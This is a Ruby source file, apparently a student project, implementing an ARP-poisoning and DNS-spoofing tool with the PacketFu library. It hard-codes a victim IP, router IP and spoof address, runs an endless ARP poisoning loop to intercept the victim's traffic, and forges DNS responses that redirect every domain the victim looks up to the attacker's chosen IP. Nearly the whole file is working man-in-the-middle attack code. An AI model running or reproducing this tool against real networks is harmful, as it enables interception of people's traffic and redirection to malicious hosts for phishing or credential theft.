#!/usr/bin/ruby

# A00746060
# Harjinder Daniel Khatkar
# DNS Spoofer
# This file contains the functions that
# are required to run the dns spoofer
# includes the dns spoof and the arp functions
require 'rubygems'
require 'packetfu'
include PacketFu

#define our target and router, plus our interface
@interface = "en1"
@myInfo = Utils.whoami?(:iface => @interface)
@addr = "192.168.0.9"
@routerIP = "192.168.0.100"
@spoofIP = "69.171.234.21"
@routerMac = Utils.arp(@routerIP, :iface => @interface)
@victimMac = Utils.arp(@addr, :iface => @interface)


#Arp spoof function that is used to generate
#the man in the middle attack. our machine will
#now be intercepting the victims packets
def runspoof(arp_packet_target,arp_packet_router)
    # Send out both packets
    #puts "Spoofing...."
    caught=false
    while caught==false do
        sleep 1
        arp_packet_target.to_w(@interface)
        arp_packet_router.to_w(@interface)
    end
end

# DNS spoof function that will accept DNS packets from the target IP
# It will accept query requests, store the domain and create a query response
# Redirecting the victim machine to a IP we defined earlier.
def dnsspoof_run
    puts "Waiting for DNS Packets............:"
    iface = @interface
    capture_session = PacketFu::Capture.new(:iface => iface,
                                            :start => true,
                                            :promisc => true,
                                            :filter => "udp and port 53 and src #{@addr}")
    #Capture all packets from port 53 and from the source defined earlier
    capture_session.stream.each do |p|
        pkt = Packet.parse(p)
        dnsCount = pkt.payload[2].to_s+pkt.payload[3].to_s
        if dnsCount=='10'
            @domainName = getDomainName(pkt.payload[12..-1])
            puts "DNS Request for " + @domainName
            
            #Split and Generate the bytes for the IP we defined earlier
            ipToSpoof = @spoofIP.split('.')
            spoofIPHex = [ipToSpoof[0].to_i, ipToSpoof[1].to_i, ipToSpoof[2].to_i, ipToSpoof[3].to_i].pack('c*')

            #create query response (raw packets)
            udp_pkt = UDPPacket.new(:config => @myInfo)
            udp_pkt.udp_src = pkt.udp_dst
            udp_pkt.udp_dst = pkt.udp_src
            udp_pkt.eth_daddr   = @victimMac
            udp_pkt.ip_daddr    = @addr
            udp_pkt.ip_saddr    = pkt.ip_daddr
            
            #Transaction ID (must be same for request and response)
            udp_pkt.payload     =  pkt.payload[0,2]
            
            #DNS header before Domain Name
            udp_pkt.payload     += "\x81"+"\x80"+"\x00"+"\x01"+"\x00"+"\x01"
            udp_pkt.payload     += "\x00"+"\x00"+"\x00"+"\x00"
            
            #split the domaine name by the "." ex. www.google.com
            @domainName.split('.').each do |domainString|
                #put length before each part of the domain
                udp_pkt.payload += domainString.length.chr
                #section of domain
                udp_pkt.payload += domainString
            end
            
            #DNS header after domain name
            udp_pkt.payload     += "\x00"+"\x00"+"\x01"+"\x00"+"\x01"+"\xc0"
            udp_pkt.payload     += "\x0c"+"\x00"+"\x01"+"\x00"+"\x01"
            #DNS TTL and Length
            udp_pkt.payload     += "\x00"+"\x00"+"\x02"+"\x56"+"\x00"+"\x04"
            #our ip to send to
            udp_pkt.payload     += spoofIPHex
            #recalculation of fields
            udp_pkt.recalc
            #send to interface
            udp_pkt.to_w(@interface);
        end
    end
end

# Function to Get the domain name from the payload.
def getDomainName(payload)
    domainName = ""
    while(true)
        len = payload[0].to_i
        if (len != 0)
            domainName += payload[1,len] + "."
            payload = payload[len+1..-1]
            else
            return domainName = domainName[0,domainName.length-1]
        end
    end
end